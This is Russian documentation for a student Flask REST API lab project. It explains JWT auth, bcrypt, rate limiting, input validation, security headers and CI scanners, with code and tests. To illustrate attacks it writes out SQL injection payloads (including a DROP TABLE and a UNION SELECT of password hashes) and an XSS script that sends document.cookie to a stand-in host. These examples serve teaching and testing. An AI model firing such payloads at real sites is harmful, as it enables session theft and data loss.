# secure-rest-api: подробная документация

Полная версия описания: все меры защиты с кодом и тестами, разбор находок сканеров,
сравнение pip-audit и Dependency-Check, ответы на контрольные вопросы. Краткая версия:
[README](../README.md).

REST API на Flask с защитой от типовых уязвимостей: JWT-аутентификация, хэширование паролей
bcrypt, защита от SQL-инъекций и XSS, проверки SAST и SCA в CI.

Стек: Python 3.12, Flask 3, SQLAlchemy 2 (SQLite), pydantic 2, bcrypt, PyJWT, Flask-Limiter,
pytest, ruff.

## Локальный запуск

```bash
python -m venv .venv
source .venv/bin/activate        # Windows: .venv\Scripts\activate
pip install -r requirements.txt
cp .env.example .env             # Windows: copy .env.example .env, затем задать JWT_SECRET в .env
flask --app wsgi init-db         # создать таблицы
flask --app wsgi create-user alice   # пароль спросит скрыто
flask --app wsgi run
```

Сгенерировать `JWT_SECRET` (только так, а не вручную: стойкость секрета даёт случайность, а не
длина):

```bash
python -c "import secrets; print(secrets.token_urlsafe(48))"
```

Переменные окружения (см. `.env.example`):

| Переменная | По умолчанию | Описание |
|---|---|---|
| `JWT_SECRET` | нет, обязательна | секрет подписи JWT, не короче 32 символов, иначе приложение не запустится |
| `DATABASE_URL` | `sqlite:///app.db` | строка подключения к БД |
| `JWT_TTL_MINUTES` | `15` | время жизни токена в минутах, от 1 до 1440 |
| `RATE_LIMIT_ENABLED` | `true` | ограничение частоты запросов к `/auth/login` |

Требования к учётным данным при `create-user`: логин 3-64 символа (латиница, цифры, точка,
дефис, подчёркивание, без учёта регистра), пароль не короче 12 символов и не длиннее 72 байт.

Тесты и проверки:

```bash
pip install -r requirements-dev.txt
pytest --cov          # тесты, покрытие не ниже 80%
ruff check .          # линтер
ruff format --check . # формат, включая python-блоки в README
bandit -r app -ll     # SAST
pip-audit -r requirements.txt   # SCA
```

### Зависимости

Прямые зависимости (то, что импортирует код) перечислены в `requirements.in`. Полный список со
всеми транзитивными зависимостями и точными версиями, `requirements.txt`, генерирует
[uv](https://docs.astral.sh/uv/), вручную он не правится:

```bash
uv pip compile requirements.in --universal --python-version 3.12 --no-annotate -o requirements.txt
```

Флаг `--universal` даёт один файл для всех ОС, а не только для той, на которой его
сгенерировали. `--no-annotate` убирает пояснения вида `# via flask`: анализатор Python в
Dependency-Check принимает такие строки за пакеты без версии. Откуда взялся пакет, показывает
`uv pip tree --invert --package werkzeug`: Werkzeug требуется Flask, а Flask требуется
Flask-Limiter и Flask-SQLAlchemy. Существующие версии при перегенерации сохраняются; обновить один пакет:
`uv pip compile ... --upgrade-package werkzeug`, все сразу: `--upgrade`. CI перегенерирует файл и
падает, если он не совпадает с закоммиченным, так что правка руками или забытая перегенерация
не пройдут. SCA-сканеры проверяют именно `requirements.txt`, то есть ровно то, что
устанавливается.

## Формат ответов

Все ответы, включая ошибки, приходят в одном JSON-конверте:

```json
{"success": true, "data": {...}, "error": null}
{"success": false, "data": null, "error": "Текст ошибки"}
```

## Эндпоинты

| Метод и путь | Доступ | Тело запроса | Успешный ответ |
|---|---|---|---|
| `GET /health` | всем | нет | 200, `{"status": "ok"}` |
| `POST /auth/login` | всем, не больше 5 запросов в минуту с одного IP | `{"username": str, "password": str}` | 200, `{"access_token", "token_type": "Bearer", "expires_in"}` |
| `GET /api/data` | с JWT | нет | 200, список последних 100 постов |
| `POST /api/posts` | с JWT | `{"title": str, "body": str}` | 201, созданный пост |

`POST /auth/login` и `GET /api/data` заданы в лабораторной, `POST /api/posts` это третий метод
на выбор: через него в базу попадает пользовательский текст, на котором видна защита от XSS.

Пост в ответе: `{"id", "title", "body", "author", "created_at"}`. Поля `title`, `body` и
`author` экранированы для HTML, `created_at` в формате ISO 8601 (UTC). Автор поста берётся из
токена, задать его в теле запроса нельзя.

Ограничения на поля: `username` до 64 символов, `password` до 128 символов, `title` от 1 до
120 символов, `body` от 1 до 5000 символов. Лишние поля в теле запроса запрещены, типы не
приводятся (число вместо строки даёт 400).

### Коды ошибок

| Код | Когда |
|---|---|
| 400 | тело не JSON-объект, нет обязательных полей, неверный тип или длина, лишние поля |
| 401 | неверный логин или пароль; нет заголовка `Authorization`; токен поддельный, просроченный или выдан удалённому пользователю. Для `/api/*` в ответе заголовок `WWW-Authenticate: Bearer realm="api"` |
| 404 | неизвестный путь |
| 405 | неподдерживаемый метод, например `GET /auth/login` (в ответе заголовок `Allow`) |
| 413 | тело запроса больше 16 КБ |
| 429 | больше 5 попыток входа в минуту с одного IP |
| 500 | внутренняя ошибка; подробности только в логе сервера, клиенту общий текст |

## Примеры curl

JSON в ответах ниже отформатирован для читаемости. Сервер отдаёт его в одну строку, а кириллицу
кодирует как `\uXXXX` (стандартное поведение Flask), по смыслу это тот же JSON.
Тела запросов в примерах на латинице: curl в Windows передаёт кириллицу из `-d` в кодировке
консоли, а не в UTF-8, и сервер получает некорректный JSON (400). Кириллицу надёжно передавать
из файла: `--data-binary @post.json`.

Вход, ответ с токеном (токен сокращён):

```bash
curl -s -X POST http://127.0.0.1:5000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "alice", "password": "correct-horse-battery"}'
```

```json
{
  "data": {
    "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
    "expires_in": 900,
    "token_type": "Bearer"
  },
  "error": null,
  "success": true
}
```

Неверный пароль, тот же ответ, что и для несуществующего логина:

```json
{"data": null, "error": "Неверный логин или пароль", "success": false}
```

Запрос с токеном:

```bash
TOKEN="<access_token из ответа на вход>"
curl -s http://127.0.0.1:5000/api/data -H "Authorization: Bearer $TOKEN"
```

Запрос без токена, 401 (заголовки `Server`, `Date`, `Content-Length`, `Connection` опущены):

```bash
curl -si http://127.0.0.1:5000/api/data
```

```
HTTP/1.1 401 UNAUTHORIZED
Content-Type: application/json
WWW-Authenticate: Bearer realm="api"
X-Content-Type-Options: nosniff
Content-Security-Policy: default-src 'none'; frame-ancestors 'none'
X-Frame-Options: DENY
Referrer-Policy: no-referrer
Cache-Control: no-store

{"data": null, "error": "Требуется заголовок Authorization: Bearer <token>", "success": false}
```

Создание поста, HTML в тексте возвращается экранированным:

```bash
curl -s -X POST http://127.0.0.1:5000/api/posts \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"title": "Hello", "body": "<b>first</b> post"}'
```

```json
{
  "data": {
    "author": "alice",
    "body": "&lt;b&gt;first&lt;/b&gt; post",
    "created_at": "2026-10-01T20:21:01.217563+00:00",
    "id": 1,
    "title": "Hello"
  },
  "error": null,
  "success": true
}
```

## Меры защиты

Для каждой меры ниже: от какой атаки она защищает, как реализована, фрагмент кода из проекта и
каким тестом проверена. В конце раздела сводная таблица всех мер.

### 1. SQL-инъекции (OWASP A03: Injection)

**Атака.** Если SQL-запрос собирается склейкой строк, ввод пользователя становится частью
команды. Уязвимый вариант для сравнения (в проекте такого кода нет):

```python
query = "SELECT * FROM users WHERE username = '" + username + "'"
```

При `username = "' OR '1'='1' --"` получится `WHERE username = '' OR '1'='1' --'`: условие
всегда истинно, а `--` превращает остаток запроса в комментарий.

**Защита.** В проекте нет ни одного SQL-запроса, собранного из строк. Все обращения к БД идут
через ORM SQLAlchemy, а он строит **параметризованный запрос**: текст SQL с плейсхолдером `?`, а
значения передаются драйверу SQLite отдельно. База получает значение как данные, поэтому оно
никогда не исполняется как часть SQL.

Поиск пользователя при входе (`app/auth/users.py`):

```python
def find_user(username: str) -> User | None:
    statement = db.select(User).filter_by(username=normalize_username(username))
    return db.session.execute(statement).scalar_one_or_none()
```

Что на самом деле уходит в SQLite при попытке инъекции:

```sql
SELECT users.id, users.username, users.password_hash, users.created_at
FROM users
WHERE users.username = ?
-- параметр отдельно: "' or '1'='1' --"
```

База ищет пользователя с логином буквально `' or '1'='1' --`, не находит его, и вход
отклоняется. Посты создаются так же, через объект модели, без SQL в коде (`app/api/routes.py`):

```python
post = Post(title=data.title, body=data.body, author=current_user())
db.session.add(post)
db.session.commit()
```

Из этого SQLAlchemy строит `INSERT INTO posts (title, body, author_id, created_at) VALUES (?, ?, ?, ?)`.

**Проверка** (`tests/test_sqli.py`). В логин подставляются `' OR '1'='1' --`, `admin'--`,
`alice'--` и `' UNION SELECT id, username, password_hash FROM users --`, в пароль
`' OR '1'='1' --` и `' OR 1=1 --`: везде ответ 401 и токена нет. Пост с заголовком
`'); DROP TABLE posts; --` сохраняется в БД как обычный текст, таблицы `posts` и `users` на месте.

### 2. XSS (OWASP A03: Injection)

**Атака.** Пользователь сохраняет в пост HTML с JavaScript, например
`<script>fetch('https://evil.example/?c=' + document.cookie)</script>`. Если клиентское
приложение вставит ответ API в страницу как HTML, скрипт выполнится в браузере каждого, кто
откроет пост (хранимая XSS), и сможет украсть сессию или действовать от имени жертвы.

**Защита 1: экранирование на выходе.** Все поля с пользовательским текстом (`title`, `body`,
`author`) перед отправкой проходят через `markupsafe.escape`. Это та же функция, которой Jinja2
экранирует шаблоны во Flask. Код (`app/api/serializers.py`):

```python
from markupsafe import escape


def post_to_dict(post: Post) -> dict[str, Any]:
    # Экранируем на выходе, а не на входе: в БД лежит исходный текст
    return {
        "id": post.id,
        "title": _escape_html(post.title),
        "body": _escape_html(post.body),
        "author": _escape_html(post.author.username),
        "created_at": _iso_utc(post.created_at),
    }


def _escape_html(text: str) -> str:
    return str(escape(text))
```

`escape` заменяет пять символов, с которых начинается любой HTML-код:

| Было | Стало |
|---|---|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `&` | `&amp;` |
| `"` | `&#34;` |
| `'` | `&#39;` |

Пример: на вход `{"title": "<script>alert(1)</script>"}`, в ответе
`"title": "&lt;script&gt;alert(1)&lt;/script&gt;"`. Браузер покажет это как текст и не выполнит.

Почему на выходе, а не при записи: в БД остаются исходные данные. Правильное экранирование
зависит от того, куда данные выводятся (HTML, JSON, CSV). Если экранировать при записи, текст
испортится при повторном экранировании или при выводе в другом формате.

При этом сам API отдаёт текст уже экранированным для HTML, то есть рассчитан на веб-клиент: так
требует задание («Санитизируйте (экранируйте) все пользовательские данные, которые
возвращаются в ответах API»), и это защищает страницу, которая вставит ответ через `innerHTML`. Цена такого решения:
клиент, который выводит текст не в HTML (мобильное приложение, экспорт в CSV), получит `&lt;`
вместо `<` и должен будет сам раскодировать сущности. В реальных проектах API обычно отдаёт в
JSON сырой текст, а экранирует тот, кто выводит его в HTML: React и шаблонизаторы делают это
сами (OWASP XSS Prevention Cheat Sheet, экранирование по контексту вывода). Исходные данные в
БД не испорчены, поэтому перейти на такую схему можно без миграции, изменив только
`app/api/serializers.py`.

**Защита 2: заголовки ответа.** Даже если ответ API откроют прямо в браузере, ничего не
выполнится. Заголовки добавляются ко всем ответам, включая ошибки (`app/security.py`):

```python
SECURITY_HEADERS: dict[str, str] = {
    "X-Content-Type-Options": "nosniff",
    "Content-Security-Policy": "default-src 'none'; frame-ancestors 'none'",
    "X-Frame-Options": "DENY",
    "Referrer-Policy": "no-referrer",
    "Cache-Control": "no-store",
}


def register_security_headers(app: Flask) -> None:
    app.after_request(add_security_headers)
```

- `Content-Security-Policy: default-src 'none'` запрещает браузеру выполнять скрипты и загружать
  любые ресурсы в контексте этого ответа;
- `X-Content-Type-Options: nosniff` запрещает браузеру угадывать тип содержимого: JSON не будет
  интерпретирован как HTML;
- `X-Frame-Options: DENY` и `frame-ancestors 'none'` запрещают встраивать ответ в чужую страницу
  (защита от кликджекинга);
- `Referrer-Policy: no-referrer` и `Cache-Control: no-store` не дают утечь адресу и закэшироваться
  личным данным.

**Проверка** (`tests/test_xss.py`). `<script>alert(1)</script>` и
`"><img src=x onerror=alert(1)>` при создании поста и при чтении списка возвращаются
экранированными, в сыром теле ответа нет подстрок `<script` и `<img`, а в БД лежит исходный
текст. `tests/test_security_headers.py` проверяет заголовки на успешных ответах и на ошибках.

### 3. Аутентификация (OWASP A07: Identification and Authentication Failures, A02)

Общая схема:

```
POST /auth/login {"username", "password"}
  -> не больше 5 попыток в минуту с IP -> проверка тела запроса -> поиск пользователя
  -> сверка пароля с хэшем bcrypt -> выдача JWT (HS256, 15 минут)

GET /api/data, заголовок Authorization: Bearer <JWT>
  -> декоратор jwt_required: подпись, алгоритм, срок, издатель
  -> пользователь существует в БД -> эндпоинт выполняется
```

#### 3.1. Хранение паролей: bcrypt

**Атака.** Если пароли лежат в БД открытым текстом или как быстрый хэш (MD5, SHA-256), при
утечке базы их получают сразу или перебирают на видеокарте со скоростью миллиарды вариантов в
секунду. Одинаковые пароли дают одинаковые хэши, и их находят по готовым таблицам.

**Защита.** В БД хранится только хэш bcrypt (`app/auth/passwords.py`):

```python
BCRYPT_ROUNDS = 12
# bcrypt учитывает только первые 72 байта пароля, более длинные отклоняем явно
BCRYPT_MAX_PASSWORD_BYTES = 72


def hash_password(password: str) -> str:
    encoded = password.encode("utf-8")
    if len(encoded) > BCRYPT_MAX_PASSWORD_BYTES:
        raise PasswordTooLongError(
            f"Пароль не должен превышать {BCRYPT_MAX_PASSWORD_BYTES} байт в UTF-8"
        )
    return bcrypt.hashpw(encoded, bcrypt.gensalt(rounds=BCRYPT_ROUNDS)).decode("ascii")


def verify_password(password: str, password_hash: str) -> bool:
    encoded = password.encode("utf-8")
    if len(encoded) > BCRYPT_MAX_PASSWORD_BYTES:
        return False
    return bcrypt.checkpw(encoded, password_hash.encode("ascii"))
```

- **12 раундов** означают 2^12 итераций внутри bcrypt. Один хэш считается заметное время, для
  пользователя это незаметно, а перебор становится в тысячи раз дороже. Число раундов можно
  поднимать по мере роста мощности железа.
- **Соль** (`bcrypt.gensalt`) случайная для каждого пароля и хранится внутри хэша: в БД лежит
  строка вида `$2b$12$<соль><хэш>`. Одинаковые пароли дают разные хэши, готовые таблицы
  «пароль -> хэш» бесполезны.
- **Ограничение 72 байта.** bcrypt молча отбрасывает всё, что длиннее 72 байт. Такие пароли
  отклоняются явно, чтобы у пользователя не было ложного ощущения надёжности.

В модели `User` есть только поле `password_hash`. Пользователь создаётся командой
`flask --app wsgi create-user <логин>`, пароль вводится скрыто и с подтверждением, минимум
12 символов.

**Проверка** (`tests/test_passwords.py`): хэш начинается с `$2b$12$` и не содержит пароля,
одинаковые пароли дают разные хэши, неверный пароль не проходит, пароль длиннее 72 байт
отклоняется.

#### 3.2. Вход: защита от перебора паролей и подбора логинов

Эндпоинт входа (`app/auth/routes.py`):

```python
INVALID_CREDENTIALS = "Неверный логин или пароль"
LOGIN_RATE_LIMIT = "5 per minute"


@auth_bp.post("/login")
@limiter.limit(LOGIN_RATE_LIMIT)
def login() -> Response:
    # ... проверка тела запроса схемой LoginRequest (см. раздел 4)
    user = find_user(credentials.username)
    # Пароль проверяется и для несуществующего логина, чтобы время ответа не отличалось
    password_hash = user.password_hash if user else dummy_hash()
    password_ok = verify_password(credentials.password, password_hash)
    if user is None or not password_ok:
        return error(INVALID_CREDENTIALS, 401)

    issued = issue_token(
        user.id, current_app.config["JWT_SECRET"], current_app.config["JWT_TTL_MINUTES"]
    )
    return success(
        {"access_token": issued.token, "token_type": "Bearer", "expires_in": issued.expires_in}
    )
```

- **Перебор паролей.** `@limiter.limit("5 per minute")` (Flask-Limiter) пропускает не больше
  5 попыток входа в минуту с одного IP, дальше ответ 429. Перебор словаря становится
  непрактичным.
- **Одинаковый ответ.** И для несуществующего логина, и для неверного пароля возвращается один и
  тот же 401 «Неверный логин или пароль». По тексту ответа нельзя узнать, какие логины есть в
  системе.
- **Одинаковое время ответа.** Сверка bcrypt занимает заметное время. Если бы для
  несуществующего логина сервер отвечал сразу, по скорости ответа можно было бы находить
  существующие логины (timing-атака). Поэтому для несуществующего логина пароль всё равно
  сверяется с хэшем-заглушкой `dummy_hash()`.

**Проверка**: `tests/test_login.py` (одинаковый 401 для обоих случаев, хэш пароля не попадает
в ответ, некорректное тело даёт 400), `tests/test_rate_limit.py` (шестая попытка за минуту
получает 429, лимит не мешает другим эндпоинтам).

#### 3.3. Выдача JWT

После успешного входа выдаётся JWT (`app/auth/tokens.py`):

```python
JWT_ALGORITHM = "HS256"
JWT_ISSUER = "secure-rest-api"


def issue_token(
    user_id: int, secret: str, ttl_minutes: int, now: datetime | None = None
) -> IssuedToken:
    issued_at = now or datetime.now(UTC)
    payload = {
        "sub": str(user_id),  # кому выдан
        "iss": JWT_ISSUER,  # кто выдал
        "iat": issued_at,  # когда выдан
        "exp": issued_at + timedelta(minutes=ttl_minutes),  # когда истекает
    }
    token = jwt.encode(payload, secret, algorithm=JWT_ALGORITHM)
    return IssuedToken(token=token, expires_in=ttl_minutes * 60)
```

Токен состоит из трёх частей в Base64URL через точку: `заголовок.payload.подпись`. Подпись это
HMAC-SHA256 от заголовка и payload на секрете `JWT_SECRET`, который знает только сервер.
Расшифрованный payload реального токена:

```json
{"sub": "1", "iss": "secure-rest-api", "iat": 1791814783, "exp": 1791815683}
```

Payload не шифруется, его может прочитать кто угодно, поэтому в нём только id пользователя и
служебные поля. Изменить его нельзя: подпись перестанет сходиться, а посчитать новую без
секрета невозможно. Срок жизни 15 минут ограничивает ущерб, если токен украдут.

Секрет берётся из переменной окружения и генерируется случайно (см. раздел 6).

#### 3.4. Проверка JWT на защищённых эндпоинтах

Каждый маршрут `/api/*` закрыт декоратором `jwt_required` (`app/api/routes.py`):

```python
@api_bp.get("/data")
@jwt_required
def list_posts() -> Response: ...
```

Декоратор выполняется до кода эндпоинта (`app/auth/decorators.py`):

```python
@wraps(view)
def wrapper(*args: P.args, **kwargs: P.kwargs) -> ResponseReturnValue:
    token = _bearer_token(request.headers.get("Authorization", ""))
    if token is None:
        return error(MISSING_AUTH_MESSAGE, 401, BEARER_CHALLENGE)
    try:
        user_id = decode_token(token, current_app.config["JWT_SECRET"])
    except TokenError:
        return error(INVALID_AUTH_MESSAGE, 401, BEARER_CHALLENGE)

    # Пользователь мог быть удалён после выдачи токена
    user = db.session.get(User, user_id)
    if user is None:
        return error(INVALID_AUTH_MESSAGE, 401, BEARER_CHALLENGE)

    g.current_user = user
    return view(*args, **kwargs)
```

Сама проверка токена (`app/auth/tokens.py`):

```python
payload = jwt.decode(
    token,
    secret,
    algorithms=[JWT_ALGORITHM],  # только HS256, алгоритм из заголовка токена не используется
    issuer=JWT_ISSUER,
    options={"require": REQUIRED_CLAIMS},  # sub, iss, iat, exp обязательны
)
```

Что проверяется по порядку:

1. Заголовок `Authorization` есть и имеет вид `Bearer <token>`.
2. Подпись верна для секрета сервера: токен не подделан и не изменён.
3. Алгоритм строго HS256. Список алгоритмов задан в коде, а не берётся из токена. Поэтому не
   проходит известная атака, когда в заголовке токена пишут `"alg": "none"` («токен без
   подписи») и уязвимая библиотека принимает его без проверки.
4. Срок `exp` не истёк.
5. Издатель `iss` равен `secure-rest-api`.
6. Все claims `sub`, `iss`, `iat`, `exp` на месте.
7. Пользователь из `sub` существует в БД: токен удалённого пользователя не действует.

Любая ошибка даёт 401 с заголовком `WWW-Authenticate: Bearer realm="api"` (так требует
RFC 6750). Клиенту не сообщается, что именно не так с токеном. При успехе пользователь кладётся
в `g.current_user`, и эндпоинт берёт автора поста оттуда, а не из тела запроса.

**Декоратор в роли middleware.** В задании проверка JWT названа middleware, то есть кодом,
который выполняется до обработчика запроса. Декоратор `jwt_required` делает именно это, только
подключается к каждому маршруту отдельно. Во Flask есть три способа сделать такую проверку:

| Способ | Что закрывает | Почему выбран или нет |
|---|---|---|
| `app.before_request` | все запросы приложения | не подходит: закрыл бы и `/auth/login`, войти было бы нельзя без списка исключений |
| `api_bp.before_request` | все маршруты блюпринта `/api` | рабочий вариант: `/health` и `/auth/login` остаются открытыми, а забыть защиту на новом эндпоинте нельзя |
| декоратор `jwt_required` | каждый маршрут, на который он поставлен | **выбран**: защита видна прямо в объявлении эндпоинта, а тот же декоратор можно поставить на маршрут любого блюпринта |

Минус выбранного способа: декоратор можно забыть на новом эндпоинте, тогда как
`api_bp.before_request` такой ошибки не допускает. Этот риск закрыт тестом из раздела 3.5: CI
не пропустит маршрут `/api/*` без проверки токена.

**Проверка**: `tests/test_tokens.py` (токен с чужим секретом, просроченный, с изменённым
payload, с `alg: none`, с чужим издателем, без `exp`, мусор вместо токена: всё отклоняется),
`tests/test_jwt_required.py` (нет заголовка, неверный формат, токен удалённого пользователя).

#### 3.5. Ни один эндпоинт `/api/*` не остался без защиты (OWASP A01: Broken Access Control)

Риск декоратора в том, что его можно забыть на новом эндпоинте. Это закрыто тестом
(`tests/test_api_auth_coverage.py`): он обходит все зарегистрированные маршруты `/api/*`, шлёт
на каждый запрос без токена и требует 401.

```python
def _unprotected_endpoints(app: Flask, client: FlaskClient) -> list[str]:
    """Маршруты /api/*, которые без токена отвечают не 401."""
    return [
        f"{method} {path}"
        for path, method in _api_endpoints(app)
        if client.open(path, method=method).status_code != 401
    ]


def test_every_api_endpoint_requires_token(app: Flask, client: FlaskClient) -> None:
    assert _unprotected_endpoints(app, client) == []
```

Если убрать `@jwt_required` с `list_posts`, тест падает с сообщением
`assert ['GET /api/data'] == []`, и CI не пропускает такой код.

### 4. Проверка входных данных и mass assignment (OWASP A03, A08)

**Атака.** Клиент присылает лишние поля, например `"author": "admin"`, чтобы написать пост от
чужого имени (mass assignment). Или неожиданные типы и огромные строки, чтобы сломать логику.

**Защита.** Тело каждого запроса проверяется схемой pydantic (`app/api/schemas.py`,
`app/auth/schemas.py`):

```python
class CreatePostRequest(BaseModel):
    # strict: без неявных приведений типов; forbid: автора и прочие поля задать нельзя
    model_config = ConfigDict(strict=True, extra="forbid", frozen=True)

    title: str = Field(min_length=1, max_length=POST_TITLE_MAX_LENGTH)
    body: str = Field(min_length=1, max_length=POST_BODY_MAX_LENGTH)
```

- `extra="forbid"`: лишние поля (`author`, `role`, `id`) дают 400, а не молча игнорируются;
- `strict=True`: число вместо строки даёт 400, а не превращается в строку;
- ограничения длины: `title` от 1 до 120 символов, `body` от 1 до 5000, `username` до 64,
  `password` до 128;
- автор поста всегда берётся из токена (`author=current_user()`), в схеме такого поля нет.

Дополнительно тело запроса больше 16 КБ отклоняется с 413 ещё до разбора JSON
(`MAX_CONTENT_LENGTH = 16 * 1024` в `app/__init__.py`).

**Проверка**: `tests/test_api_posts.py` и `tests/test_login.py` (лишние поля, неверные типы,
пустые и слишком длинные строки, не JSON, слишком большое тело).

### 5. Ошибки без утечки деталей (OWASP A04, CWE-209)

**Атака.** Трейсбек в ответе показывает злоумышленнику пути к файлам, версии библиотек и
фрагменты кода.

**Защита.** Все ошибки отдаются в общем JSON-конверте. Необработанное исключение пишется в лог
сервера целиком, а клиент получает только общий текст (`app/errors.py`):

```python
def handle_unexpected_error(exc: Exception) -> Response | HTTPException:
    """Необработанное исключение: подробности только в лог, клиенту общий текст."""
    if isinstance(exc, HTTPException):
        return exc
    current_app.logger.exception("Необработанное исключение")
    return error(INTERNAL_ERROR_MESSAGE, INTERNAL_SERVER_ERROR)
```

**Проверка**: `tests/test_errors.py`.

### 6. Секреты и конфигурация (OWASP A02, A07)

**Атака.** Секрет подписи JWT в коде или в git означает, что любой, кто видел репозиторий, может
выпускать токены от имени любого пользователя. Слабый секрет можно подобрать перебором.

**Защита.** Секреты читаются только из переменных окружения (файл `.env`, он в `.gitignore`).
Настройки проверяются при старте (`app/config.py`):

```python
MIN_JWT_SECRET_LENGTH = 32


@dataclass(frozen=True)
class Settings:
    database_url: str
    jwt_secret: str = field(repr=False)  # секрет не попадёт в логи через repr
    jwt_ttl_minutes: int = DEFAULT_JWT_TTL_MINUTES
    rate_limit_enabled: bool = True

    def __post_init__(self) -> None:
        if len(self.jwt_secret) < MIN_JWT_SECRET_LENGTH:
            raise ConfigError(
                f"JWT_SECRET должен быть задан и содержать не менее "
                f"{MIN_JWT_SECRET_LENGTH} символов"
            )
```

Стойкость секрета даёт случайная генерация: `secrets.token_urlsafe(48)` (48 случайных байт,
384 бита энтропии при минимуме 256 бит для HS256 по RFC 7518). Проверка длины только отсекает
пустые и короткие значения: длинный, но неслучайный секрет вроде `"a" * 32` она пропустит,
поэтому секрет нужно генерировать командой из раздела «Локальный запуск».

**Проверка**: `tests/test_config.py` (короткий или пустой секрет не даёт запустить приложение,
секрета нет в `repr` настроек).

### Сводная таблица

| Угроза | OWASP Top 10 2021 | Мера | Где в коде | Тесты |
|---|---|---|---|---|
| SQL-инъекции | A03 | только ORM SQLAlchemy: значения уходят в драйвер связанными параметрами, SQL из строк не собирается | `app/models.py`, `app/auth/users.py`, `app/api/routes.py` | `tests/test_sqli.py` |
| XSS | A03 | `title`, `body`, `author` экранируются на выходе (`markupsafe.escape`), в БД хранится исходный текст; CSP `default-src 'none'` и `X-Content-Type-Options: nosniff` | `app/api/serializers.py`, `app/security.py` | `tests/test_xss.py` |
| Утечка паролей | A02 | только хэш bcrypt (12 раундов, соль в хэше); пароли длиннее 72 байт отклоняются явно, потому что bcrypt молча обрезает лишнее | `app/auth/passwords.py` | `tests/test_passwords.py` |
| Подделка токена | A07, A02 | JWT HS256, список алгоритмов задан жёстко (токен с `alg: none` не пройдёт), обязательны claims `sub`, `iss`, `iat`, `exp`, проверяется издатель; срок жизни 15 минут; пользователь из токена проверяется в БД | `app/auth/tokens.py`, `app/auth/decorators.py` | `tests/test_tokens.py`, `tests/test_jwt_required.py` |
| Незащищённый эндпоинт | A01 | декоратор `jwt_required` на каждом маршруте `/api/*`; тест обходит все зарегистрированные маршруты `/api/*` и требует 401 без токена, поэтому эндпоинт без декоратора роняет CI | `app/api/routes.py` | `tests/test_api_auth_coverage.py` |
| Подбор логинов | A07 | один ответ 401 для неверного логина и неверного пароля; для несуществующего логина пароль сверяется с хэшем-заглушкой, чтобы время ответа не отличалось | `app/auth/routes.py`, `app/auth/passwords.py` | `tests/test_login.py` |
| Перебор паролей | A07 | не больше 5 попыток входа в минуту с одного IP (Flask-Limiter), сверх лимита 429 | `app/auth/routes.py`, `app/extensions.py` | `tests/test_rate_limit.py` |
| Некорректный ввод, mass assignment | A03, A08 | схемы pydantic: `strict` (без приведения типов), `extra="forbid"` (лишние поля вроде `role` или `author` запрещены), ограничения длины | `app/auth/schemas.py`, `app/api/schemas.py` | `tests/test_login.py`, `tests/test_api_posts.py` |
| Большие запросы | вне Top 10 (CWE-770) | тело больше 16 КБ отклоняется с 413 | `app/__init__.py` | `tests/test_api_posts.py`, `tests/test_errors.py` |
| Утечка деталей ошибок | A04 (CWE-209) | все ошибки в общем JSON-конверте, на 500 клиент получает общий текст, трейсбек только в лог | `app/errors.py` | `tests/test_errors.py` |
| Кликджекинг, MIME-sniffing, утечка Referer, кэширование | A05 | заголовки `X-Frame-Options: DENY`, `frame-ancestors 'none'`, `nosniff`, `Referrer-Policy: no-referrer`, `Cache-Control: no-store` на всех ответах, включая ошибки | `app/security.py` | `tests/test_security_headers.py` |
| Утечка секретов | A07 (CWE-798), A02 | секреты только из переменных окружения, `.env` в `.gitignore`; `JWT_SECRET` генерируется случайно (`secrets.token_urlsafe(48)`), а значение короче 32 символов не даёт запустить приложение; секрет не попадает в `repr` настроек | `app/config.py` | `tests/test_config.py` |

Всего 124 теста, покрытие 100% (минимум для CI 80%).

## CI/CD

GitHub Actions (`.github/workflows/ci.yml`) запускается на каждый push и pull request, права
токена только на чтение. Четыре независимых job:

| Job | Инструмент | Что проверяет | Когда падает | Артефакт |
|---|---|---|---|---|
| Тесты и линтер | uv, ruff, pytest | `requirements.txt` совпадает с файлом, сгенерированным из `requirements.in`; стиль и ошибки кода (в том числе правила безопасности `S`, аналог bandit в ruff), формат, тесты | lock-файл устарел или поправлен руками, замечание ruff, упавший тест, покрытие ниже 80% | `coverage` |
| SAST (bandit) | bandit | исходный код `app/`: опасные вызовы, захардкоженные секреты, небезопасные функции | находка уровня medium и выше | `bandit-report` (HTML) |
| SCA (pip-audit) | pip-audit | все зависимости из `requirements.txt`, включая транзитивные, по базе уязвимостей PyPI | любая известная уязвимость | `pip-audit-report` (JSON) |
| SCA (OWASP Dependency-Check) | Dependency-Check | зависимости по базе NVD | уязвимость с CVSS 7.0 и выше | `dependency-check-report` (HTML) |

Последний успешный запуск pipeline: [успешные запуски ветки main](https://github.com/Goga211/secure-rest-api/actions/workflows/ci.yml?query=branch%3Amain+is%3Asuccess),
верхний в списке. Каждый push в README запускает CI заново, поэтому постоянная ссылка ведёт на
отфильтрованный список, а не на конкретный номер.

Где смотреть отчёты: вкладка **Actions** репозитория → нужный запуск workflow **CI** → блок
**Artifacts** внизу страницы запуска. Секреты в workflow не используются, поэтому все проверки
работают и в pull request из форков.

Защита самого pipeline: сторонний action Dependency-Check закреплён по SHA коммита, а не по
плавающей ветке, и секреты ему не передаются; раннер зафиксирован (`ubuntu-24.04`); `checkout` не
сохраняет токен CI в `.git` (`persist-credentials: false`), а у самого токена только право
на чтение.

### Скриншоты отчётов

[Запуск CI #30](https://github.com/Goga211/secure-rest-api/actions/runs/40289762760) (коммит
`99d3feb`): все четыре job прошли успешно, сохранено 4 артефакта.

![Запуск CI](screenshots/ci-run.png)

**SAST, bandit** (`bandit-report.html`): 463 строки кода, замечаний уровня medium и выше нет.
Одно замечание уровня low, B105 «возможный захардкоженный пароль» на строку `"token_type":
"Bearer"` в `app/auth/routes.py`. Это ложное срабатывание: `Bearer` это тип токена по
RFC 6750, а не пароль. CI падает только на medium и выше (`-ll`), поэтому замечание не
блокирует сборку, но остаётся в отчёте.

![Отчёт bandit](screenshots/bandit-report.png)

**SCA, OWASP Dependency-Check** (`dependency-check-report.html`): проверено 26 зависимостей,
уязвимых 0, подавленных 0. До перехода на lock-файл (раздел «Зависимости») здесь была одна
уязвимость, подавленная с обоснованием, CVE-2025-45770; почему она больше не находится, описано
в разборе ниже.

![Отчёт Dependency-Check](screenshots/dependency-check-report.png)

**SCA, pip-audit** (`pip-audit-report.json`): проверено 22 пакета, уязвимостей нет:

```json
